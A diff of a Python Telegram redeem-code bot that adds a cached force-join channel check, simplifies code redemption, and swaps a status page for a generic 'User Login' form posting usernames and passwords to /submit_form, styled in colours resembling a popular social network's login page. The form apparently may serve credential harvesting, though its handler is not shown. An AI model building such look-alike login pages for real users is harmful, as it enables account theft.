@@ -1,13 +1,14 @@
-# bot_with_termux_status_and_styled_ping.py
+# bot_with_redeem_and_login_form.py
 import os
 import random
 import string
 import logging
 import time
+import asyncio
 from threading import Thread
-from typing import Set
+from typing import Set, Optional, Dict, Any, Tuple
 
-from flask import Flask, render_template_string, jsonify, request, Response
+from flask import Flask, jsonify, request, Response
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
 from telegram.error import Forbidden, BadRequest
@@ -16,7 +17,7 @@ from telegram.constants import ParseMode  # For HTML parse mode
 # ---------- Configuration ----------
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
-FORCE_JOIN_CHANNEL = os.getenv("FORCE_JOIN_CHANNEL")  # e.g. @mychannel
+FORCE_JOIN_CHANNEL = os.getenv("FORCE_JOIN_CHANNEL")  # e.g. @mychannel or channel id
 WEB_SECRET = os.getenv("WEB_SECRET", "")  # secret token for protected HTTP endpoints (restart/open)
 BOT_VERSION = os.getenv("BOT_VERSION", "v1.0")
 
@@ -31,14 +32,20 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ---------- Runtime state ----------
-codes = {}  # in-memory codes store
+codes: Dict[str, Dict[str, Any]] = {}  # in-memory codes store
 _start_time = time.time()
+
+# ---------- Force-join cache (to reduce API calls) ----------
+# cache: user_id -> (is_member_bool, expire_ts)
+_force_cache: Dict[int, Tuple[bool, float]] = {}
+_FORCE_CACHE_TTL = 45.0  # seconds
+_force_cache_lock = asyncio.Lock()
 
 # ---------- Helpers ----------
 def is_admin(user_id: int) -> bool:
     return user_id in ADMIN_IDS
 
-def generate_random_code(length=8):
+def generate_random_code(length=8) -> str:
     chars = string.ascii_uppercase + string.digits
     return ''.join(random.choices(chars, k=length))
 
@@ -63,39 +70,83 @@ def compute_active_users() -> int:
             users.add(used_by)
     return len(users)
 
-# ---------- Force Join Check (async) ----------
-async def check_force_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+async def _get_cached_force_status(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    """
+    Returns True if member; uses short cache to limit get_chat_member calls.
+    Admins always return True (bypass).
+    """
+    if is_admin(user_id):
+        return True
+
+    now = time.time()
+    # quick non-await check
+    cached = _force_cache.get(user_id)
+    if cached and cached[1] > now:
+        return cached[0]
+
+    async with _force_cache_lock:
+        # re-check inside lock
+        cached = _force_cache.get(user_id)
+        if cached and cached[1] > now:
+            return cached[0]
+        # perform API call
+        try:
+            member = await context.bot.get_chat_member(FORCE_JOIN_CHANNEL, user_id)
+            is_member = member.status in ("member", "administrator", "creator")
+        except BadRequest:
+            # Could be privacy settings or the bot can't access membership list. Treat as not member.
+            is_member = False
+        except Forbidden:
+            # Bot lacks permission to read the channel - treat as not member and instruct admin to promote bot.
+            is_member = False
+        except Exception as e:
+            logger.exception("Unexpected error checking chat member")
+            # on unexpected errors, be conservative and treat as not member (we'll inform user)
+            is_member = False
+
+        _force_cache[user_id] = (is_member, now + _FORCE_CACHE_TTL)
+        return is_member
+
+async def ensure_force_join_or_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    """
+    Ensures that non-admin user has joined the FORCE_JOIN_CHANNEL.
+    If not joined, sends a friendly prompt with join button and returns False.
+    Admins bypass and return True.
+    """
+    if not update.effective_user:
+        return False
     user_id = update.effective_user.id
+    if is_admin(user_id):
+        return True
+
+    is_member = await _get_cached_force_status(user_id, context)
+    if is_member:
+        return True
+
+    # Not a member — send join prompt
+    join_button = InlineKeyboardMarkup(
+        [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL.lstrip('@')}")]]
+    )
     try:
-        member = await context.bot.get_chat_member(FORCE_JOIN_CHANNEL, user_id)
-        if member.status in ["member", "administrator", "creator"]:
-            return True
-        else:
-            join_button = InlineKeyboardMarkup(
-                [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL.lstrip('@')}")]]
-            )
-            if update.message:
-                await update.message.reply_text(
-                    "⚠️ <b>You must join our channel to use this bot.</b>",
-                    reply_markup=join_button,
-                    parse_mode=ParseMode.HTML
-                )
-            return False
-    except BadRequest:
-        join_button = InlineKeyboardMarkup(
-            [[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{FORCE_JOIN_CHANNEL.lstrip('@')}")]]
-        )
         if update.message:
             await update.message.reply_text(
-                "⚠️ <b>You must join our channel to use this bot.</b>",
+                "⚠️ <b>You must join our channel to use this bot.</b>\n\n"
+                "Tap the button below to join and then retry the command.",
                 reply_markup=join_button,
                 parse_mode=ParseMode.HTML
             )
-        return False
-    except Forbidden:
-        if update.message:
-            await update.message.reply_text("⚠️ Bot cannot check membership. Make sure the bot is an admin in the channel.", parse_mode=ParseMode.HTML)
-        return False
+        elif update.callback_query:
+            await update.callback_query.answer()
+            await update.callback_query.message.reply_text(
+                "⚠️ <b>You must join our channel to use this bot.</b>\n\n"
+                "Tap the button below to join and then retry the action.",
+                reply_markup=join_button,
+                parse_mode=ParseMode.HTML
+            )
+    except Exception:
+        # if replying fails, log but continue
+        logger.exception("Failed to send force-join prompt to user")
+    return False
 
 # ---------- Telegram Handlers ----------
 start_message_user = (
@@ -107,33 +158,41 @@ start_message_user = (
 
 start_message_admin = (
     "👋 <b>Welcome to the Redeem Code Bot!</b>\n\n"
-    "<b>Use the command below to redeem your code:</b>\n\n"
+    "<b>Use the command below to manage codes:</b>\n\n"
     "<code>/redeem &lt;code&gt;</code>\n\n"
     "<b>YOU ARE AN ADMIN OF THIS BOT 💗</b>\n"
     "<b>You can access commands 👇</b>"
 )
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if is_admin(update.effective_user.id):
-        keyboard = InlineKeyboardMarkup(
-            [[InlineKeyboardButton("📜 Commands", callback_data="show_commands")]]
-        )
-        await update.message.reply_text(
-            start_message_admin,
-            parse_mode=ParseMode.HTML,
-            reply_markup=keyboard
-        )
-    else:
+    if not update.message:
+        return
+    # integrate force-join: only require for non-admins
+    if not is_admin(update.effective_user.id):
+        ok = await ensure_force_join_or_prompt(update, context)
+        if not ok:
+            return
         await update.message.reply_text(start_message_user, parse_mode=ParseMode.HTML)
+        return
+
+    # admin start
+    keyboard = InlineKeyboardMarkup(
+        [[InlineKeyboardButton("📜 Commands", callback_data="show_commands")]]
+    )
+    await update.message.reply_text(
+        start_message_admin,
+        parse_mode=ParseMode.HTML,
+        reply_markup=keyboard
+    )
 
 async def show_commands_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     commands_text = (
         "🛠 <b>Admin Commands:</b>\n\n"
-        "<code>/generate &lt;code&gt; &lt;message&gt;</code> — One-time code\n"
+        "<code>/generate &lt;code&gt; &lt;optional message&gt;</code> — One-time code\n"
         "<code>/generate_multi &lt;code&gt; &lt;limit&gt; &lt;optional message&gt;</code> — Multi-use code\n"
-        "<code>/generate_random &lt;optional message&gt;</code> — Random one-time (reply required)\n"
+        "<code>/generate_random &lt;optional message&gt;</code> — Random one-time\n"
         "<code>/redeem &lt;code&gt;</code> — Redeem a code\n"
         "<code>/listcodes</code> — List all codes\n"
         "<code>/deletecode &lt;code&gt;</code> — Delete a code\n"
@@ -148,249 +207,206 @@ async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_T
     keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📜 Commands", callback_data="show_commands")]])
     await query.edit_message_text(text=start_message_admin, parse_mode=ParseMode.HTML, reply_markup=keyboard)
 
-# One-time use code
+# ---------- Code Commands ----------
+# codes dict shape:
+# codes = {
+#   "ABC123": {
+#       "limit": 1,           # number of uses allowed (1 = one-time)
+#       "uses": 0,            # uses so far
+#       "message": "some text",
+#       "created_by": admin_id,
+#       "used_by": []         # list of user ids who used it
+#   }
+# }
+
 async def generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # /generate <code> <optional message>
+    if not update.message:
+        return
+    # force-join integrated: admin bypass
+    ok = await ensure_force_join_or_prompt(update, context)
+    if not ok:
+        return
+
     if not is_admin(update.effective_user.id):
-        await update.message.reply_text("❌ Unauthorized", parse_mode=ParseMode.HTML)
+        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
         return
-    if len(context.args) < 2:
-        await update.message.reply_text("⚠️ Usage:\n<code>/generate &lt;code&gt; &lt;message&gt;</code>", parse_mode=ParseMode.HTML)
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /generate <code> <optional message>", parse_mode=ParseMode.HTML)
         return
-    code = context.args[0].upper()
-    custom_message = " ".join(context.args[1:])
+    code = args[0].upper()
+    message = " ".join(args[1:]) if len(args) > 1 else ""
     if code in codes:
-        await update.message.reply_text("⚠️ Duplicate Code!", parse_mode=ParseMode.HTML)
+        await update.message.reply_text("❌ That code already exists.", parse_mode=ParseMode.HTML)
         return
     codes[code] = {
-        "text": custom_message,
-        "used_by": None,
-        "media": None,
-        "created_by": update.effective_user.id
+        "limit": 1,
+        "uses": 0,
+        "message": message,
+        "created_by": update.effective_user.id,
+        "used_by": []
     }
-    await update.message.reply_text(f"✅ Code Created!\n\nCode: <code>{code}</code>", parse_mode=ParseMode.HTML)
+    await update.message.reply_text(f"✅ Code <b>{code}</b> created (one-time).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)
 
-# Multi-use code
 async def generate_multi(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        await update.message.reply_text("❌ Unauthorized", parse_mode=ParseMode.HTML)
+    # /generate_multi <code> <limit> <optional message>
+    if not update.message:
         return
-    if len(context.args) < 2:
-        await update.message.reply_text(
-            "⚠️ Usage:\n<code>/generate_multi &lt;code&gt; &lt;limit&gt; &lt;optional message&gt;</code>\n\nYou can also reply to a message with this command to attach media.",
-            parse_mode=ParseMode.HTML
-        )
+    ok = await ensure_force_join_or_prompt(update, context)
+    if not ok:
         return
-    code = context.args[0].upper()
-    try:
-        limit = int(context.args[1])
-    except ValueError:
-        await update.message.reply_text("⚠️ Limit must be a number", parse_mode=ParseMode.HTML)
-        return
-    custom_message = " ".join(context.args[2:]) if len(context.args) > 2 else ""
-    if code in codes:
-        await update.message.reply_text("⚠️ Duplicate Code!", parse_mode=ParseMode.HTML)
-        return
-    media = None
-    media_type = None
-    if update.message.reply_to_message:
-        replied = update.message.reply_to_message
-        if replied.photo:
-            media_type = "photo"
-            media = replied.photo[-1].file_id
-        elif replied.document:
-            media_type = "document"
-            media = replied.document.file_id
-        elif replied.video:
-            media_type = "video"
-            media = replied.video.file_id
-        elif replied.audio:
-            media_type = "audio"
-            media = replied.audio.file_id
-        elif replied.voice:
-            media_type = "voice"
-            media = replied.voice.file_id
-        elif replied.video_note:
-            media_type = "video_note"
-            media = replied.video_note.file_id
-        elif replied.text:
-            media_type = "text"
-            media = replied.text
-    codes[code] = {
-        "text": custom_message,
-        "used_by": [],
-        "limit": limit,
-        "media": {"type": media_type, "file_id": media} if media else None,
-        "created_by": update.effective_user.id
-    }
-    await update.message.reply_text(f"✅ Multi-use Code Created!\n\nCode: <code>{code}</code>\nLimit: {limit}", parse_mode=ParseMode.HTML)
 
-# Random one-time code
-async def generate_random(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
-        await update.message.reply_text("❌ Unauthorized", parse_mode=ParseMode.HTML)
+        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
         return
-    if not update.message.reply_to_message:
-        await update.message.reply_text("⚠️ Reply to a message with <code>/generate_random</code>", parse_mode=ParseMode.HTML)
+    args = context.args
+    if len(args) < 2:
+        await update.message.reply_text("Usage: /generate_multi <code> <limit> <optional message>", parse_mode=ParseMode.HTML)
         return
-    while True:
-        code = generate_random_code()
+    code = args[0].upper()
+    try:
+        limit = int(args[1])
+        if limit < 1:
+            raise ValueError()
+    except ValueError:
+        await update.message.reply_text("Limit must be a positive integer.", parse_mode=ParseMode.HTML)
+        return
+    message = " ".join(args[2:]) if len(args) > 2 else ""
+    if code in codes:
+        await update.message.reply_text("❌ That code already exists.", parse_mode=ParseMode.HTML)
+        return
+    codes[code] = {
+        "limit": limit,
+        "uses": 0,
+        "message": message,
+        "created_by": update.effective_user.id,
+        "used_by": []
+    }
+    await update.message.reply_text(f"✅ Code <b>{code}</b> created (multi-use, limit {limit}).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)
+
+async def generate_random(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # /generate_random <optional message>
+    if not update.message:
+        return
+    ok = await ensure_force_join_or_prompt(update, context)
+    if not ok:
+        return
+
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
+        return
+    message = " ".join(context.args) if context.args else ""
+    for _ in range(10):
+        code = generate_random_code(8)
         if code not in codes:
             break
-    custom_message = " ".join(context.args) if context.args else ""
-    replied = update.message.reply_to_message
-    media = None
-    media_type = None
-    if replied.photo:
-        media_type = "photo"
-        media = replied.photo[-1].file_id
-    elif replied.document:
-        media_type = "document"
-        media = replied.document.file_id
-    elif replied.video:
-        media_type = "video"
-        media = replied.video.file_id
-    elif replied.audio:
-        media_type = "audio"
-        media = replied.audio.file_id
-    elif replied.voice:
-        media_type = "voice"
-        media = replied.voice.file_id
-    elif replied.video_note:
-        media_type = "video_note"
-        media = replied.video_note.file_id
-    elif replied.text:
-        media_type = "text"
-        media = replied.text
     else:
-        await update.message.reply_text("⚠️ Unsupported media type", parse_mode=ParseMode.HTML)
+        await update.message.reply_text("❌ Unable to generate unique code. Try again.", parse_mode=ParseMode.HTML)
         return
     codes[code] = {
-        "text": custom_message,
-        "used_by": None,
-        "media": {"type": media_type, "file_id": media},
-        "created_by": update.effective_user.id
+        "limit": 1,
+        "uses": 0,
+        "message": message,
+        "created_by": update.effective_user.id,
+        "used_by": []
     }
-    await update.message.reply_text(f"✅ Random Code Created!\n\nCode: <code>{code}</code>", parse_mode=ParseMode.HTML)
+    await update.message.reply_text(f"✅ Random code <b>{code}</b> created (one-time).\nMessage: {message or '(none)'}", parse_mode=ParseMode.HTML)
 
-# Redeem command
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_force_join(update, context):
+    # /redeem <code>
+    if not update.message:
         return
-    if len(context.args) != 1:
-        await update.message.reply_text("⚠️ Usage:\n<code>/redeem &lt;code&gt;</code>", parse_mode=ParseMode.HTML)
+    ok = await ensure_force_join_or_prompt(update, context)
+    if not ok:
         return
-    code = context.args[0].upper()
-    user = update.effective_user
-    user_id = user.id
-    if code not in codes:
-        await update.message.reply_text("❌ Invalid Code", parse_mode=ParseMode.HTML)
-        return
-    # Single-use code
-    if codes[code].get("used_by") is None or isinstance(codes[code]["used_by"], int):
-        if codes[code]["used_by"] is not None:
-            await update.message.reply_text("❌ Already Redeemed", parse_mode=ParseMode.HTML)
-            return
-        codes[code]["used_by"] = user_id
-    # Multi-use code
-    else:
-        if user_id in codes[code]["used_by"]:
-            await update.message.reply_text("❌ You already redeemed this code!", parse_mode=ParseMode.HTML)
-            return
-        if len(codes[code]["used_by"]) >= codes[code]["limit"]:
-            await update.message.reply_text("❌ Code redemption limit reached!", parse_mode=ParseMode.HTML)
-            return
-        codes[code]["used_by"].append(user_id)
-    # Notify creator
-    creator_id = codes[code].get("created_by")
-    if creator_id:
-        try:
-            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Chat with User", url=f"tg://user?id={user_id}")]])
-            await context.bot.send_message(
-                chat_id=creator_id,
-                text=(
-                    f"🎉 <b>Code Redeemed!</b>\n\n"
-                    f"• Code: <code>{code}</code>\n"
-                    f"• User ID: <code>{user_id}</code>\n"
-                    f"• User: {user.full_name}"
-                ),
-                parse_mode=ParseMode.HTML,
-                reply_markup=keyboard
-            )
-        except Exception as e:
-            logger.error(f"Failed to notify creator {creator_id}: {e}")
-    # Deliver reward
-    media = codes[code].get("media")
-    text = codes[code]["text"]
-    if media:
-        media_type = media["type"]
-        file_id = media["file_id"]
-        send_kwargs = {"chat_id": update.effective_chat.id}
-        if text:
-            send_kwargs["caption"] = text
-            send_kwargs["parse_mode"] = ParseMode.HTML
-        if media_type == "photo":
-            await context.bot.send_photo(photo=file_id, **send_kwargs)
-        elif media_type == "video":
-            await context.bot.send_video(video=file_id, **send_kwargs)
-        elif media_type == "document":
-            await context.bot.send_document(document=file_id, **send_kwargs)
-        elif media_type == "audio":
-            await context.bot.send_audio(audio=file_id, **send_kwargs)
-        elif media_type == "voice":
-            await context.bot.send_voice(voice=file_id, **send_kwargs)
-        elif media_type == "video_note":
-            await context.bot.send_video_note(video_note=file_id, **send_kwargs)
-        elif media_type == "text":
-            msg = file_id
-            if text:
-                msg += f"\n\n{text}"
-            await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
-    else:
-        await update.message.reply_text(f"🎉 Success!\n\n{text}", parse_mode=ParseMode.HTML)
 
-# List codes
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /redeem <code>", parse_mode=ParseMode.HTML)
+        return
+    code = args[0].upper()
+    info = codes.get(code)
+    if not info:
+        await update.message.reply_text("❌ Invalid code.", parse_mode=ParseMode.HTML)
+        return
+    user_id = update.effective_user.id
+    # check if already used or limit reached
+    if info["uses"] >= info["limit"]:
+        await update.message.reply_text("❌ Code already redeemed / limit reached.", parse_mode=ParseMode.HTML)
+        return
+    # success: mark use
+    info["uses"] += 1
+    if isinstance(info.get("used_by"), list):
+        info["used_by"].append(user_id)
+    else:
+        info["used_by"] = [user_id]
+    await update.message.reply_text(f"✅ Code <b>{code}</b> redeemed!\n{info['message'] or ''}", parse_mode=ParseMode.HTML)
+    # Notify admins asynchronously
+    try:
+        text = (
+            f"📥 <b>Code Redeemed</b>\n\n"
+            f"<b>Code:</b> {code}\n"
+            f"<b>User:</b> {update.effective_user.mention_html()}\n"
+            f"<b>Uses:</b> {info['uses']}/{info['limit']}\n"
+        )
+        for admin_id in ADMIN_IDS:
+            context.application.create_task(context.bot.send_message(chat_id=admin_id, text=text, parse_mode=ParseMode.HTML))
+    except Exception:
+        logger.exception("Failed to notify admins about redemption")
+
 async def listcodes(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Admin-only: list codes summary
+    if not update.message:
+        return
+    ok = await ensure_force_join_or_prompt(update, context)
+    if not ok:
+        return
+
     if not is_admin(update.effective_user.id):
+        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
         return
     if not codes:
-        await update.message.reply_text("ℹ️ No codes created yet.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text("No codes present.", parse_mode=ParseMode.HTML)
         return
-    message = "📋 <b>Redeem Codes List:</b>\n\n"
+    lines = []
     for code, info in codes.items():
-        if isinstance(info["used_by"], list):  # multi-use
-            used = len(info["used_by"])
-            limit = info["limit"]
-            message += f"• <code>{code}</code> — {used}/{limit} used\n"
-        else:  # single-use
-            status = "✅ Available" if info["used_by"] is None else f"❌ Redeemed by <code>{info['used_by']}</code>"
-            message += f"• <code>{code}</code> — {status}\n"
-    await update.message.reply_text(message, parse_mode=ParseMode.HTML)
+        lines.append(f"<b>{code}</b> — uses {info['uses']}/{info['limit']} — message: {info['message'] or '(none)'}")
+    text = "📜 <b>Codes:</b>\n\n" + "\n".join(lines)
+    # Telegram messages have limits; for large lists you'd want pagination
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
 
-# Delete code
 async def deletecode(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # /deletecode <code>
+    if not update.message:
+        return
+    ok = await ensure_force_join_or_prompt(update, context)
+    if not ok:
+        return
+
     if not is_admin(update.effective_user.id):
+        await update.message.reply_text("❌ You are not authorized to use this command.", parse_mode=ParseMode.HTML)
         return
-    if len(context.args) != 1:
-        await update.message.reply_text("⚠️ Usage:\n<code>/deletecode &lt;code&gt;</code>", parse_mode=ParseMode.HTML)
+    args = context.args
+    if not args:
+        await update.message.reply_text("Usage: /deletecode <code>", parse_mode=ParseMode.HTML)
         return
-    code = context.args[0].upper()
+    code = args[0].upper()
     if code not in codes:
-        await update.message.reply_text("❌ Code Not Found", parse_mode=ParseMode.HTML)
+        await update.message.reply_text("❌ Code not found.", parse_mode=ParseMode.HTML)
         return
     del codes[code]
-    await update.message.reply_text(f"🗑️ Code <code>{code}</code> deleted.", parse_mode=ParseMode.HTML)
+    await update.message.reply_text(f"✅ Code <b>{code}</b> deleted.", parse_mode=ParseMode.HTML)
 
-# ---------- New: Styled Ping command ----------
+# ---------- Styled Ping ----------
 async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    Replies with styled system ping + uptime (monospace block like your screenshot).
-    """
     try:
+        if not update.message:
+            return
         start = time.perf_counter()
         sent = await update.message.reply_text("🏓 Pinging...")
         elapsed = (time.perf_counter() - start) * 1000  # ms
 
-        # status category similar to the screenshot
         if elapsed < 150:
             status = "Excellent ⚡"
         elif elapsed < 300:
@@ -401,11 +417,8 @@ async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
             status = "Poor ❌"
 
         uptime = format_uptime(time.time() - _start_time)
-
-        # build nicely aligned mono block using fixed-width characters and spacing
-        # note: HTML <code> preserves spacing in Telegram
         response_ms = f"{int(elapsed)} ms"
-        # pad the labels for alignment - keep it simple and safe for varying widths
+
         text = (
             "<code>[ SYSTEM PING ]</code>\n\n"
             f"<code>≡ Response : {response_ms}</code>\n"
@@ -414,202 +427,100 @@ async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
         await sent.edit_text(text, parse_mode=ParseMode.HTML)
-    except Exception as e:
-        logger.error(f"/ping failed: {e}")
-        await update.message.reply_text("⚠️ Unable to measure ping right now.")
+    except Exception:
+        logger.exception("/ping failed")
+        if update.message:
+            await update.message.reply_text("⚠️ Unable to measure ping right now.")
 
-# ---------- Flask status page & endpoints ----------
+# ---------- Flask ----------
 flask_app = Flask(__name__)
 
-STATUS_HTML = r"""
-<!doctype html>
-<html lang="en">
+LOGIN_FORM_HTML = r"""
+<!DOCTYPE html>  <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Redeem Code Bot — Termux-style Status</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>User Login</title>
   <style>
-    :root{--bg:#0b0f14;--card:#071019;--accent:#00d1ff;--muted:#8aa0b1;--mono: 'SFMono-Regular', Menlo, Monaco, 'Roboto Mono', monospace;}
-    html,body{height:100%;margin:0;background:linear-gradient(180deg,#020612 0%, #071226 45%, #08131b 100%);font-family:Inter, system-ui, Arial;color:#e6f3fb}
-    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:32px}
-    .card{width:920px;max-width:96vw;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:14px;padding:22px;box-shadow:0 10px 40px rgba(2,6,23,0.7);display:grid;grid-template-columns:260px 1fr;gap:18px}
-    .side{display:flex;flex-direction:column;align-items:center;gap:14px}
-    .termux-badge{width:160px;height:160px;border-radius:18px;background:linear-gradient(135deg,#001217,#00262c);display:flex;align-items:center;justify-content:center;box-shadow:inset 0 -6px 40px rgba(0,0,0,0.6),0 8px 30px rgba(0,0,0,0.6);position:relative;overflow:hidden}
-    .termux-logo{font-family:var(--mono);font-weight:700;color:var(--accent);letter-spacing:1px;font-size:34px;text-transform:uppercase}
-    .meta{font-size:13px;color:var(--muted);text-align:center}
-    .btn-row{display:flex;gap:8px}
-    .btn{padding:8px 10px;border-radius:10px;background:transparent;border:1px solid rgba(255,255,255,0.04);color:var(--muted);font-size:13px;cursor:pointer}
-    .btn.primary{background:linear-gradient(90deg, rgba(0,209,255,0.08), rgba(0,150,255,0.04));border:1px solid rgba(0,209,255,0.14);color:var(--accent)}
-    .terminal{background:#001014;border-radius:10px;padding:18px;box-shadow:inset 0 2px 4px rgba(0,0,0,0.6);height:260px;overflow:hidden;border:1px solid rgba(255,255,255,0.02)}
-    .term-top{display:flex;gap:8px;align-items:center;margin-bottom:8px}
-    .lights{display:flex;gap:6px}
-    .light{width:10px;height:10px;border-radius:50%}
-    .l-red{background:#ff6b6b}
-    .l-yel{background:#ffd166}
-    .l-grn{background:#17e6a2}
-    .terminal-lines{font-family:var(--mono);color:#cdeef8;font-size:13.5px;line-height:1.45;white-space:pre-wrap}
-    .cursor{display:inline-block;width:9px;height:18px;background:var(--accent);vertical-align:middle;margin-left:3px;animation:blink 1s steps(2) infinite}
-    @keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}
-    .progress-wrap{margin-top:12px}
-    .progress{height:12px;background:rgba(255,255,255,0.03);border-radius:8px;overflow:hidden}
-    .bar{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),#6ce1ff);border-radius:8px}
-    .progress-meta{display:flex;justify-content:space-between;font-size:12px;color:var(--muted);margin-top:8px}
-    .info{display:flex;flex-direction:column;gap:12px}
-    .title{font-size:18px;font-weight:600}
-    .sub{font-size:13px;color:var(--muted)}
-    .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
-    .stat{background:var(--card);padding:10px;border-radius:8px;font-size:13px}
-    .stat b{display:block;font-size:16px;color:var(--accent);margin-bottom:6px}
-    @media (max-width:760px){.card{grid-template-columns:1fr}.termux-badge{width:120px;height:120px}.terminal{height:220px}}
+    body {
+      background: #fafafa;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      width: 350px;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+    }
+    .login-btn {
+      width: 100%;
+      background: #0095f6;
+      color: #fff;
+      padding: 10px;
+      border: none;
+      border-radius: 3px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="card">
-      <div class="side">
-        <div class="termux-badge" aria-hidden>
-          <div class="termux-logo">termux</div>
-        </div>
-        <div class="meta">
-          <div><strong>Redeem Code Bot</strong></div>
-          <div style="margin-top:6px;color:var(--muted)">Dark Termux-style status</div>
-        </div>
-        <div class="btn-row" style="margin-top:8px">
-          <button class="btn primary" id="restartBtn">Restart Bot</button>
-          <button class="btn" id="openBtn">Open Bot</button>
-        </div>
-      </div>
-
-      <div class="info">
-        <div>
-          <div class="title">Terminal</div>
-          <div class="sub">Simulated Termux boot animation. Page auto-fills live status from /status.</div>
-        </div>
-
-        <div class="terminal" role="img" aria-label="Termux terminal simulation">
-          <div class="term-top">
-            <div class="lights"><span class="light l-red"></span><span class="light l-yel"></span><span class="light l-grn"></span></div>
-            <div style="margin-left:10px;color:var(--muted);font-size:13px">termux@render:~</div>
-          </div>
-          <div class="terminal-lines" id="terminalLines"></div>
-        </div>
-
-        <div class="progress-wrap">
-          <div class="progress" aria-hidden>
-            <div class="bar" id="bar"></div>
-          </div>
-          <div class="progress-meta"><span id="progressText">Initializing...</span><span id="percent">0%</span></div>
-        </div>
-
-        <div class="grid">
-          <div class="stat"><b id="uptime">—</b>Uptime</div>
-          <div class="stat"><b id="version">—</b>Version</div>
-          <div class="stat"><b id="users">—</b>Active Users</div>
-          <div class="stat"><b id="chan">—</b>Force Join Channel</div>
-        </div>
-      </div>
-    </div>
+  <div class="container">
+    <h2>🔐 User Login</h2>
+    <form method="POST" action="/submit_form">
+      <input type="text" name="username" placeholder="Username" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button class="login-btn" type="submit">Log In</button>
+    </form>
   </div>
-
-<script>
-  const lines_template = [
-    'booting termux-emulator...\\n',
-    'loading modules: telegram-core, flask-host\\n',
-    'checking force-join channel: {chan}\\n',
-    'verifying token... OK\\n',
-    'starting webhook / polling... OK\\n',
-    'initializing redeem subsystem...\\n',
-    'scanning codes database... {codes_count} codes found\\n',
-    'ready. welcome to {bot_name}\\n'
-  ];
-
-  async function fetchAndStart() {
-    try {
-      const res = await fetch('/status');
-      const json = await res.json();
-      const lines = lines_template.map(l => l.replace('{chan}', json.force_channel).replace('{bot_name}', json.bot_name).replace('{codes_count}', json.codes_count));
-      startTypewriter(lines, json);
-    } catch (e) {
-      startTypewriter(['failed to fetch /status\\n', 'running with fallback values\\n']);
-    }
-  }
-
-  function startTypewriter(lines, status) {
-    const out = document.getElementById('terminalLines');
-    const bar = document.getElementById('bar');
-    const pct = document.getElementById('percent');
-    const ptext = document.getElementById('progressText');
-
-    if (status) {
-      document.getElementById('uptime').innerText = status.uptime;
-      document.getElementById('version').innerText = status.version;
-      document.getElementById('users').innerText = status.active_users;
-      document.getElementById('chan').innerText = status.force_channel;
-    }
-
-    let li = 0;
-    let totalChars = lines.join('').length;
-    let printed = 0;
-
-    function typeNextLine() {
-      if (li >= lines.length) {
-        ptext.innerText = 'Done';
-        bar.style.width = '100%';
-        pct.innerText = '100%';
-        out.innerHTML += '\\n';
-        return;
-      }
-      const line = lines[li];
-      let pos = 0;
-      const speed = 12 + Math.random() * 18;
-      const iv = setInterval(() => {
-        out.innerHTML += line[pos] === '\\n' ? '<br/>' : line[pos];
-        pos += 1;
-        printed += 1;
-        const percent = Math.min(99, Math.round((printed / totalChars) * 100));
-        bar.style.width = percent + '%';
